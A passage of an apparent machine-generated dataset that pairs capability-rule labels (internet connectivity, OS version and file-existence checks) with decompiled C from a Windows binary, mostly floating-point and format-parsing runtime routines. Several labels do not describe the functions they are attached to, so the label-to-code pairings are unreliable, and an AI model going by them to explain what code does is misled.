CONCAT412(0xffffffff, \n                                        CONCAT48(0xffffffff, \n                                                 CONCAT44(-((*0x5546b0 & param_1) >> 0x20 == 0), \n                                                          -((*0x5546b0 & param_1) == 0))));\n                    if ((SUB161(auVar17 >> 7, 0) & 1 | (SUB161(auVar17 >> 0xf, 0) & 1) << 1 |\n                         (SUB161(auVar17 >> 0x17, 0) & 1) << 2 | (SUB161(auVar17 >> 0x1f, 0) & 1) << 3 |\n                         (SUB161(auVar17 >> 0x27, 0) & 1) << 4 | (SUB161(auVar17 >> 0x2f, 0) & 1) << 5 |\n                         (SUB161(auVar17 >> 0x37, 0) & 1) << 6 | (SUB161(auVar17 >> 0x3f, 0) & 1) << 7) == 0xff) {\n                        if ((param_1 & 0x8000000000000000) != 0) {\n                            if ((uVar2 != 0xff) ||\n                               (iVar16 = CONCAT44(param_3, param_2) << ((param_3 & *0x5546d4) >> 0x14) - 0x3f4, \n                               iVar18 = uVar19 << (*0x5546dc >> 0x14), \n                               auVar17 = CONCAT412(-(iVar18 >> 0x20 == 0), \n                                                   CONCAT48(-(iVar18 == 0), \n                                                            CONCAT44(-(iVar16 >> 0x20 == 0), -(iVar16 == 0)))), \n                               (SUB161(auVar17 >> 7, 0) & 1 | (SUB161(auVar17 >> 0xf, 0) & 1) << 1 |\n                                (SUB161(auVar17 >> 0x17, 0) & 1) << 2 | (SUB161(auVar17 >> 0x1f, 0) & 1) << 3 |\n                                (SUB161(auVar17 >> 0x27, 0) & 1) << 4 | (SUB161(auVar17 >> 0x2f, 0) & 1) << 5 |\n                                (SUB161(auVar17 >> 0x37, 0) & 1) << 6 | (SUB161(auVar17 >> 0x3f, 0) & 1) << 7) == 0xff))\n                            {\n                                if ((param_3 & 0x80000000) != 0) {\n                                    return 0;\n                                }\n                                goto code_r0x004d3c5f;\n                            }\n                            if ((param_3 & 0x80000000) == 0) {\n                                return *0x554728;\n                            }\n                            goto code_r0x004d3b19;\n                        }\n                        if ((param_3 & 0x80000000) != 0) {\n                            return 0;\n                        }\n                        goto code_r0x004d3c5f;\n                    }\n                    goto code_r0x004d3b5f;\n                }\n                if (uVar2 == 0xff) {\n                    in_XMM3_Qa = 0;\n                    iVar16 = CONCAT44(param_3, param_2) << ((param_3 & *0x5546d4) >> 0x14) - 0x3f4;\n                    iVar18 = uVar19 << ((SUB164(auVar15 >> 0x60, 0) & *0x5546dc) >> 0x14);\n                    auVar17 = CONCAT412(-(iVar18 >> 0x20 == 0), \n                                        CONCAT48(-(iVar18 == 0), \n                                                 CONCAT44(-(iVar16 >> 0x20 == SUB164(ZEXT816(*0x554730) >> 0x20, 0)), \n                                                          -(iVar16 == SUB84(*0x554730, 0)))));\n                    in_XMM2_Qa = SUB168(auVar17 >> 0x40, 0);\n                    uVar7 = (SUB161(auVar17 >> 7, 0) & 1 | (SUB161(auVar17 >> 0xf, 0) & 1) << 1 |\n                             (SUB161(auVar17 >> 0x17, 0) & 1) << 2 | (SUB161(auVar17 >> 0x1f, 0) & 1) << 3 |\n                             (SUB161(auVar17 >> 0x27, 0) & 1) << 4 | (SUB161(auVar17 >> 0x2f, 0) & 1) << 5 |\n                             (SUB161(auVar17 >> 0x37, 0) & 1) << 6 | (SUB161(auVar17 >> 0x3f, 0) & 1) << 7) + 0x3ff01 &\n                            0x40000;\n                    if (0xf < uVar8) {\n                        uVar8 = 0xbfe7f;\n                        in_XMM3_Qa = 0;\n                        goto code_r0x004d3576;\n                    }\n                    goto code_r0x004d3994;\n                }\n                dVar22 = param_1 >> 0x20;\n                in_XMM2_Qa = uVar19 >> 0x20;\n                uVar8 = uVar3 | uVar9 & 0x7fffffff;\n                uVar7 = 0;\n                dVar23 = dVar12;\n                if (uVar8 != 0) {\n                    uVar10 = 0x1c;\n                    _auStack12 = *0x554750;\n                    goto code_r0x004d3cce;\n                }\ncode_r0x004d3a1a:\n                if ((uVar8 & 0x7fffffff) == 0) {\n                    if ((param_3 & 0x80000000) == 0) {\n                        if ((uVar8 & uVar7 << 0xd) == 0) {\n                            return 0;\n                        }\ncode_r0x004d3b19:\n                        return *0x554730;\n                    }\n                    uVar10 = 0x1b;\n                    _auStack12 = (uVar8 & uVar7 << 0xd | 0x7ff00000) << 0x20;\n                    goto code_r0x004d3cce;\n                }\n            }\n            else {\n                uVar7 = 0;\ncode_r0x004d3994:\n                auVar17 = pinsrw(ZEXT816(0), 0x43f0, 3);\n                dVar23 = SUB168(auVar17, 0) * param_1;\n                uVar8 = uVar9;\n                dVar25 = *0x5546b0;\n                dVar22 = *0x5546c0;\n                if (uVar3 == 0) goto code_r0x004d3a1a;\n            }\n            dVar12 = (dVar23 & CONCAT44(*0x5546d4, *0x5546d0)) >> 0x2c;\n            uVar8 = (SUB82(dVar12, 0) & 0xff) + 1 & 0x1fe;\n            dVar25 = (dVar25 & dVar23 | dVar22) * *(uVar8 * 4 + 0x557378);\n            dVar22 = *(uVar8 * 4 + 0x557378);\n            dVar13 = *(uVar8 * 8 + 0x557860);\n            dVar24 = *(uVar8 * 8 + 0x557868);\n            uVar8 = 0x43e7f;\n            goto code_r0x004d3576;\n        }\n        uVar7 = uVar9;\n        if ((0x7fefffff < (uVar9 & 0x7fffffff)) && ((0x7ff00000 < (uVar9 & 0x7fffffff) || (uVar3 != 0)))) {\ncode_r0x004d3b5f:\n            _auStack12 = param_1 + param_1;\n            uVar10 = 0x3ee;\n            goto code_r0x004d3cce;\n        }\n    }\n    dVar22 = SUB168(auVar17, 0);\n    uVar19 = in_XMM3_Qa & SUB168(auVar17 >> 0x40, 0);\n    auVar15 = CONCAT412(-(uVar19 >> 0x20 == 0), \n                        CONCAT48(-(uVar19 == 0), \n                                 CONCAT44(-((*0x5546b0 & dVar22) >> 0x20 == 0), -((*0x5546b0 & dVar22) == 0))));\n    if ((SUB161(auVar15 >> 7, 0) & 1 | (SUB161(auVar15 >> 0xf, 0) & 1) << 1 | (SUB161(auVar15 >> 0x17, 0) & 1) << 2 |\n         (SUB161(auVar15 >> 0x1f, 0) & 1) << 3 | (SUB161(auVar15 >> 0x27, 0) & 1) << 4 |\n         (SUB161(auVar15 >> 0x2f, 0) & 1) << 5 | (SUB161(auVar15 >> 0x37, 0) & 1) << 6 |\n        (SUB161(auVar15 >> 0x3f, 0) & 1) << 7) == 0xff) {\n        if ((uVar3 | uVar7 ^ 0xbff00000) != 0) {\n            if ((auVar17 & 0x8000000000000000) == 0x0) {\n                if ((uVar1 & 0x7ff0) < 0x3ff0) {\n                    return 0;\n                }\n            }\n            else if (0x3fef < (uVar1 & 0x7ff0)) {\n                return 0;\n            }\ncode_r0x004d3c5f:\n            return *0x554720;\n        }\ncode_r0x004d3ccb:\n        return 1;\n    }\n    uVar10 = 0x3ee;\n    _auStack12 = dVar22 + dVar22;\ncode_r0x004d3cce:\n    fcn.004043c2(&param_1, &param_2, auStack12, uVar10);\n    return _auStack12;\n}\n",
        "token_count": 6245
    },
    "004df078": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004df078(uint param_1, uint32_t param_2, int32_t param_3, uint32_t param_4)\n\n{\n    uint uVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    bool in_ZF;\n    uint16_t in_FPUControlWord;\n    uint16_t in_FPUStatusWord;\n    uint unaff_retaddr;\n    uint32_t arg_8h;\n    \n    arg_8h = param_2 & 0xffff0000 | in_FPUControlWord;\n    if (in_ZF) {\n        if (((in_EAX & 0xfffff) == 0) && (param_3 == 0)) {\n            uVar2 = in_EAX & 0x80000000;\n            uVar3 = uVar2;\n            goto joined_r0x004df0c7;\n        }\n        uVar3 = fcn.0040653c();\n    }\n    else {\n        uVar3 = param_4;\n        if ((param_4 & 0x7ff00000) == 0) {\n            if (((param_4 & 0xfffff) == 0) && (param_3 == 0)) {\n                uVar3 = 2;\n                goto code_r0x004df111;\n            }\n            uVar2 = param_4 & 0x80000000;\n        }\n        else {\n            uVar2 = param_4 & 0x80000000;\n        }\njoined_r0x004df0c7:\n        if (uVar2 == 0) {\n            if (*0x5705dc == 0) {\n                uVar2 = uVar3 & 0xffff0000 | in_FPUControlWord;\n                if (in_FPUControlWord != 0x27f) {\n                    if (((in_FPUControlWord & 0x20) != 0) &&\n                       (uVar2 = uVar3 & 0xffff0000 | in_FPUStatusWord,  (in_FPUStatusWord & 0x20) != 0)) {\n                        uVar1 = fcn.00403107(arg_8h, unaff_retaddr, param_3, param_4);\n                        return CONCAT44(arg_8h, uVar1);\n                    }\n                    uVar2 = uVar2 & 0xffff0020;\n                }\n                return CONCAT44(arg_8h, uVar2);\n            }\n            goto code_r0x00402b44;\n        }\n        uVar3 = 1;\n    }\ncode_r0x004df111:\n    if (*0x5705dc == 0) {\n        uVar1 = fcn.00403107(arg_8h, unaff_retaddr, param_3, param_4);\n        return CONCAT44(arg_8h, uVar1);\n    }\ncode_r0x00402b44:\n    return CONCAT44(arg_8h, uVar3);\n}\n",
        "token_count": 654
    },
    "004dfd9e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.004dfd9e(double param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint arg_14h;\n    double dVar6;\n    double dVar7;\n    uchar in_XMM0 [16];\n    double dVar8;\n    double dVar9;\n    double dVar10;\n    double dVar11;\n    double dStack12;\n    \n    iVar4 = 0;\n    while( true ) {\n        uVar2 = SUB162(in_XMM0 >> 0x30, 0) >> 4;\n        dVar6 = SUB168(in_XMM0, 0) & *0x55b870 | *0x55b8e0;\n        dVar7 = SUB168(in_XMM0, 0) & *0x55b878 | *0x55b8e8;\n        uVar1 = SUB82(*0x55b890 + dVar6, 0) & 0x7f0;\n        dVar11 = *0x55b8a8 & dVar7;\n        dVar9 = (*0x55b8a0 & dVar6) * *(uVar1 + 0x55be90) - *0x55b880;\n        dVar6 = (dVar6 - (*0x55b8a0 & dVar6)) * *(uVar1 + 0x55be90);\n        dVar8 = (dVar7 - dVar11) * *(uVar1 + 0x55be98);\n        dVar7 = dVar6 + dVar9;\n        dVar11 = dVar8 + (dVar11 * *(uVar1 + 0x55be98) - *0x55b888);\n        uVar3 = uVar2 - 1;\n        if (uVar3 < 0x7fe) {\n            iVar4 = (uVar2 - 0x3ff) + iVar4;\n            dVar10 = iVar4;\n            iVar5 = 0;\n            if (uVar1 + iVar4 * 0x400 == 0) {\n                iVar5 = 0x10;\n            }\n            return ((*0x55b938 * dVar11 + *0x55b948) * dVar11 + *0x55b958) * dVar11 * dVar11 +\n                   ((*0x55b930 * dVar7 + *0x55b940) * dVar7 + *0x55b950) * dVar7 * dVar7 * dVar7 * dVar7 * dVar7 +\n                   *0x55b960 * dVar7 + *(uVar1 + 0x55b9b8) + dVar10 * *0x55b8b8 + (dVar8 & *(iVar5 + 0x55b8c8)) +\n                   *(uVar1 + 0x55b9b0) + dVar9 + dVar10 * *0x55b8b0 + (dVar6 & *(iVar5 + 0x55b8c0));\n        }\n        dStack12 = -(*0x55b8f0 == param_1);\n        if (SUB82(dStack12, 0) != 0) break;\n        if (uVar3 != 0xffffffff) {\n            if (uVar3 < 0x7ff) {\n                if (*0x55b8e0 == (param_1 & *0x55b870 | *0x55b8e0)) {\n                    return *0x55b918;\n                }\n                arg_14h = 0x3e9;\n                dStack12 = *0x55b870;\n            }\n            else if (((uVar2 & 0x7ff) < 0x7ff) || ((SUB84(param_1, 0) | param_1 >> 0x20 & 0xfffff) == 0)) {\n                dStack12 = -NAN;\n                arg_14h = 9;\n            }\n            else {\n                arg_14h = 0x3e9;\n            }\n            goto code_r0x004dffaa;\n        }\n        in_XMM0 = CONCAT88(dVar11, param_1 * *0x55b900);\n        iVar4 = -0x34;\n    }\n    arg_14h = 8;\n    dStack12 = *0x55b910;\ncode_r0x004dffaa:\n    fcn.004043c2(&param_1, &param_1, &dStack12, arg_14h);\n    return dStack12;\n}\n",
        "token_count": 1039
    },
    "004e0a5e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.004e0a5e(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    unkint10 in_ST0;\n    ulong uStack32;\n    uint16_t uStack24;\n    \n    uStack32._0_4_ = in_ST0;\n    uStack32._4_4_ = in_ST0 >> 0x20;\n    uStack32 = in_ST0;\n    uStack24 = in_ST0 >> 0x40;\n    uStack24 = uStack24 & 0x7fff;\n    if (uStack24 < 0x3fff) {\n        return 0;\n    }\n    if (uStack32._4_4_ < 0) {\n        if (uStack24 < 0x403e) {\n            uVar2 = 0x3e - uStack24;\n            uVar3 = uStack32._4_4_;\n            if (0x1f < uVar2) {\n                uVar3 = 0;\n                uStack32._0_4_ = uStack32._4_4_;\n            }\n            uVar1 = uStack32 >> (uVar2 & 0x1f) | uVar3 << 0x20 - (uVar2 & 0x1f);\n            uVar3 = uVar3 >> (uVar2 & 0x1f);\n            if (in_ST0 < 0) {\n                bVar4 = uVar1 != 0;\n                uVar1 = -uVar1;\n                uVar3 = -(uVar3 + bVar4);\n            }\n            return CONCAT44(uVar3, uVar1);\n        }\n        if (((uStack24 < 0x403f) && ((uStack32._4_4_ * 2 | uStack32) == 0)) && (in_ST0 < 0)) {\n            return uStack32;\n        }\n    }\n    return 0x8000000000000000;\n}\n",
        "token_count": 460
    },
    "00401c62": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00401c62(char *param_1)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    char *var_8h;\n    char *var_4h;\n    \n    if (*(param_1 + 0x1c) != 1) goto code_r0x004a6374;\n    in_EAX = *(param_1 + 0x10);\n    cVar1 = *in_EAX;\n    if (cVar1 == '%') goto code_r0x004a6374;\n    iVar2 = *(param_1 + 0x45c);\n    var_4h = param_1;\n    if (iVar2 == 0) {\n        var_4h = NULL;\n        if ((cVar1 < '0') || ('9' < cVar1)) {\n            *(param_1 + 0x45c) = 1;\n            iVar2 = 1;\n            goto code_r0x004a6382;\n        }\n        var_8h = param_1;\n        in_EAX = fcn.004048e5(in_EAX, &var_4h, 10);\n        if ((in_EAX < 1) || (in_EAX = var_4h,  *var_4h != '$')) {\n            *(param_1 + 0x45c) = 1;\n            goto code_r0x004a6374;\n        }\n        if (*(param_1 + 0x458) == 1) {\n            fcn.0040314d(param_1 + 0x464, 0, 0x640);\n        }\n        in_EAX = *(param_1 + 0x10);\n        *(param_1 + 0x45c) = 2;\n    }\n    else {\ncode_r0x004a6382:\n        if (iVar2 != 2) goto code_r0x004a6374;\n    }\n    var_8h = NULL;\n    iVar2 = fcn.004048e5(in_EAX, &var_8h, 10);\n    pcVar5 = iVar2 + -1;\n    in_EAX = var_8h + 1;\n    *(param_1 + 0xaa8) = pcVar5;\n    *(param_1 + 0x10) = in_EAX;\n    if (*(param_1 + 0x458) == 1) {\n        if (((pcVar5 < 0) || (*var_8h != '$')) || (99 < pcVar5)) {\n            puVar3 = fcn.004039a4();\n            *puVar3 = 0x16;\n            uVar4 = fcn.00403751();\n            return uVar4 & 0xffffff00;\n        }\n        in_EAX = *(param_1 + 0xaa4);\n        if (pcVar5 <= in_EAX) {\n            pcVar5 = in_EAX;\n        }\n        *(param_1 + 0xaa4) = pcVar5;\n    }\ncode_r0x004a6374:\n    return in_EAX & 0xffffff00 | 1;\n}\n",
        "token_count": 716
    },
    "00401d39": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t fcn.00401d39(void)\n\n{\n    uint32_t uVar1;\n    float10 in_ST0;\n    uint32_t uStack28;\n    uint16_t uStack24;\n    \n    if (1 < *0x56ec4c) {\n        return in_ST0;\n    }\n    uStack28 = in_ST0 >> 0x20;\n    uStack24 = in_ST0 >> 0x40;\n    uStack24 = uStack24 & 0x7fff;\n    uVar1 = in_ST0 < 0;\n    if (uStack24 < 0x3fff) {\n        return 0;\n    }\n    if (uStack28 < 0) {\n        if (uStack24 < 0x401e) {\n            return (uStack28 >> (0x3eU - uStack24 & 0x1f) ^ -uVar1) + uVar1;\n        }\n        if (((uStack24 < 0x401f) && (uVar1 != 0)) && (uStack28 == 0x80000000)) {\n            return uStack28;\n        }\n    }\n    return 0x80000000;\n}\n",
        "token_count": 262
    },
    "0040210d": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040210d(int32_t param_1)\n\n{\n    uint32_t in_EAX;\n    \n    if ((*(param_1 + 0x45c) != 2) || (in_EAX = 1,  *(param_1 + 0x458) != 1)) {\n        in_EAX = in_EAX & 0xffffff00;\n    }\n    return in_EAX;\n}\n",
        "token_count": 96
    },
    "004025e5": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004025e5(int32_t param_1)\n\n{\n    uint32_t in_EAX;\n    \n    if ((*(param_1 + 0x45c) != 2) || (in_EAX = 1,  *(param_1 + 0x458) != 1)) {\n        in_EAX = in_EAX & 0xffffff00;\n    }\n    return in_EAX;\n}\n",
        "token_count": 96
    },
    "00402aae": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00402aae(uint16_t *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint16_t *puVar5;\n    uint16_t *var_8h;\n    uint16_t *var_4h;\n    \n    if (*(param_1 + 0xe) != 1) goto code_r0x004a6727;\n    in_EAX = *(param_1 + 8);\n    uVar1 = *in_EAX;\n    if (uVar1 == 0x25) goto code_r0x004a6727;\n    iVar2 = *(param_1 + 0x22e);\n    var_4h = param_1;\n    if (iVar2 == 0) {\n        var_4h = NULL;\n        if ((uVar1 < 0x30) || (0x39 < uVar1)) {\n            *(param_1 + 0x22e) = 1;\n            iVar2 = 1;\n            goto code_r0x004a6736;\n        }\n        var_8h = param_1;\n        in_EAX = fcn.00403607(in_EAX, &var_4h, 10);\n        if ((in_EAX < 1) || (in_EAX = var_4h,  *var_4h != 0x24)) {\n            *(param_1 + 0x22e) = 1;\n            goto code_r0x004a6727;\n        }\n        if (*(param_1 + 0x22c) == 1) {\n            fcn.0040314d(param_1 + 0x232, 0, 0x640);\n        }\n        in_EAX = *(param_1 + 8);\n        *(param_1 + 0x22e) = 2;\n    }\n    else {\ncode_r0x004a6736:\n        if (iVar2 != 2) goto code_r0x004a6727;\n    }\n    var_8h = NULL;\n    iVar2 = fcn.00403607(in_EAX, &var_8h, 10);\n    puVar5 = iVar2 + -1;\n    in_EAX = var_8h + 1;\n    *(param_1 + 0x554) = puVar5;\n    *(param_1 + 8) = in_EAX;\n    if (*(param_1 + 0x22c) == 1) {\n        if (((puVar5 < 0) || (*var_8h != 0x24)) || (99 < puVar5)) {\n            puVar3 = fcn.004039a4();\n            *puVar3 = 0x16;\n            uVar4 = fcn.00403751();\n            return uVar4 & 0xffffff00;\n        }\n        in_EAX = *(param_1 + 0x552);\n        if (puVar5 <= in_EAX) {\n            puVar5 = in_EAX;\n        }\n        *(param_1 + 0x552) = puVar5;\n    }\ncode_r0x004a6727:\n    return in_EAX & 0xffffff00 | 1;\n}\n",
        "token_count": 732
    },
    "00402bad": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00402bad(uint noname_0, uint noname_1, int32_t arg_10h)\n\n{\n    uint arg_8h;\n    int32_t iVar1;\n    float10 fVar2;\n    ushort uVar3;\n    uint16_t uVar4;\n    uint uVar5;\n    double dVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    double dStack16;\n    int32_t var_4h;\n    \n    arg_8h = fcn.004051a0(0x133f, 0xffff);\n    uVar4 = noname_1 >> 0x10;\n    uVar3 = noname_1;\n    dVar6 = CONCAT26(uVar4, CONCAT24(uVar3, noname_0));\n    uVar7 = dVar6 >> 0x20;\n    if ((uVar4 & 0x7ff0) == 0x7ff0) {\n        iVar1 = fcn.004051b9(noname_0, uVar7);\n        if (0 < iVar1) {\n            if (iVar1 < 3) goto code_r0x004b1f85;\n            if (iVar1 == 3) {\n                fVar2 = fcn.0040598e(noname_0, CONCAT26(uVar4, CONCAT24(uVar3, noname_0)) >> 0x20, SUB84(arg_10h, 0));\n                fcn.004051a0(arg_8h, 0xffff);\n                goto code_r0x004b1f44;\n            }\n        }\n        dVar6 = CONCAT26(uVar4, CONCAT24(uVar3, noname_0));\n        uVar9 = SUB84(*0x54fba0 + dVar6, 0);\n        uVar10 = *0x54fba0 + dVar6 >> 0x20;\n        uVar7 = SUB84(arg_10h, 0);\n        uVar8 = arg_10h >> 0x20;\n        uVar5 = 8;\n        goto code_r0x004b20b7;\n    }\n    if (dVar6 == 0.0) {\ncode_r0x004b1f85:\n        fcn.004051a0(arg_8h, 0xffff);\n        return CONCAT26(uVar4, CONCAT24(uVar3, noname_0));\n    }\n    fVar2 = fcn.00403a03(noname_0, uVar7, &var_4h);\n    if (arg_10h < 0) {\n        if (var_4h < -0x80000000 - arg_10h) {\ncode_r0x004b2016:\n            uVar9 = SUB84(0 * fVar2, 0);\n            uVar10 = 0 * fVar2 >> 0x20;\ncode_r0x004b202b:\n            uVar7 = SUB84(arg_10h, 0);\n            uVar8 = arg_10h >> 0x20;\n            dVar6 = CONCAT26(uVar4, CONCAT24(uVar3, noname_0));\n            uVar5 = 0x12;\n            goto code_r0x004b20b7;\n        }\ncode_r0x004b1fcd:\n        var_4h = var_4h + arg_10h;\n        if (0xa00 < var_4h) goto code_r0x004b2085;\n        if (var_4h < 0x401) {\n            if (var_4h < -0x9fd) goto code_r0x004b2016;\n            if (-0x3fe < var_4h) {\n                fVar2 = fcn.00405236(SUB84(fVar2, 0), fVar2 >> 0x20, var_4h);\n                fcn.004051a0(arg_8h, 0xffff);\ncode_r0x004b1f44:\n                dStack16 = fVar2;\n                return dStack16;\n            }\n            fVar2 = fcn.00405236(SUB84(fVar2, 0), fVar2 >> 0x20, var_4h + 0x600);\n            uVar9 = SUB84(fVar2, 0);\n            uVar10 = fVar2 >> 0x20;\n            goto code_r0x004b202b;\n        }\n        fVar2 = fcn.00405236(SUB84(fVar2, 0), fVar2 >> 0x20, var_4h + -0x600);\n        uVar9 = SUB84(fVar2, 0);\n        uVar10 = fVar2 >> 0x20;\n        uVar7 = SUB84(arg_10h, 0);\n        uVar8 = arg_10h >> 0x20;\n    }\n    else {\n        if (var_4h <= 0x7fffffff - arg_10h) goto code_r0x004b1fcd;\ncode_r0x004b2085:\n        fVar2 = fcn.004045f7(*0x552560, *0x552560 >> 0x20, SUB84(fVar2, 0), fVar2 >> 0x20);\n        uVar9 = SUB84(fVar2, 0);\n        uVar10 = fVar2 >> 0x20;\n        uVar7 = SUB84(arg_10h, 0);\n        uVar8 = arg_10h >> 0x20;\n    }\n    dVar6 = CONCAT26(uVar4, CONCAT24(uVar3, noname_0));\n    uVar5 = 0x11;\ncode_r0x004b20b7:\n    fVar2 = fcn.0040663b(uVar5, 0x19, dVar6, uVar7, uVar8, uVar9, uVar10, arg_8h);\n    return fVar2;\n}\n",
        "token_count": 1339
    },
    "00402eaf": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402eaf(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    \n    if (-1 < arg_8h) {\n        if (arg_8h < 3) {\n            uVar1 = *0x5705d4;\n            *0x5705d4 = arg_8h;\n            return uVar1;\n        }\n        if (arg_8h == 3) {\n            return *0x5705d4;\n        }\n    }\n    puVar2 = fcn.004039a4();\n    *puVar2 = 0x16;\n    fcn.00403751();\n    return 0xffffffff;\n}\n",
        "token_count": 157
    },
    "00402fd6": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402fd6(int32_t param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    cVar2 = fcn.00402d3d();\n    if (cVar2 != '\\0') {\n        if (*(param_1 + 0x10) != 0) {\ncode_r0x0049b9d2:\n            do {\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                if (*(param_1 + 0x450) == 2) {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049b9bb:\n                iVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x32) = iVar1;\n                if (iVar1 != 0) {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049b9d2;\n                    uVar4 = fcn.004033e6(*(param_1 + 0x32), *(param_1 + 0x1c));\n                    *(param_1 + 0x1c) = uVar4;\n    // switch table (8 cases) at 0x49b9f0\n                    switch(uVar4) {\n                    case 0:\n                        cVar2 = fcn.00403c74();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049b9bb;\n                    case 2:\n                        cVar2 = fcn.00405899();\n                        break;\n                    case 3:\n                        cVar2 = fcn.00401258();\n                        break;\n                    case 4:\n                        goto code_r0x0049b995;\n                    case 5:\n                        cVar2 = fcn.00401e9c();\n                        break;\n                    case 6:\n                        cVar2 = fcn.00401fcd();\n                        break;\n                    case 7:\n                        cVar2 = fcn.00402699();\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049b927;\n                    default:\n                        goto code_r0x0049b914;\n                    }\n                    if (cVar2 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049b9bb;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n            } while( true );\n        }\ncode_r0x0049b914:\n        puVar3 = fcn.004039a4();\n        *puVar3 = 0x16;\n        fcn.00403751();\n    }\ncode_r0x0049b927:\n    return 0xffffffff;\ncode_r0x0049b995:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049b9bb;\n}\n",
        "token_count": 818
    },
    "00403035": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
